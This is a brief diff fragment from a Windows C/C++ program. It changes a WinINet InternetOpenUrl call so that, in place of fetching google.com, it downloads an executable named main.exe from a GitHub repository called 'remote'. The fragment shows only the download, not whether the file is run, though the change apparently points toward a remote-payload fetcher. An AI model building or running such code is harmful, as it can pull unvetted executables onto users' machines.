@@ -24,7 +24,7 @@ int main()
 
         if (hInternet)
         {
-            HINTERNET hConnect = InternetOpenUrl(hInternet, "https://google.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
+            HINTERNET hConnect = InternetOpenUrl(hInternet, "https://raw.githubusercontent.com/tankhellfire/remote/main/main.exe", NULL, 0, INTERNET_FLAG_RELOAD, 0);
 
             if (hConnect)
             {
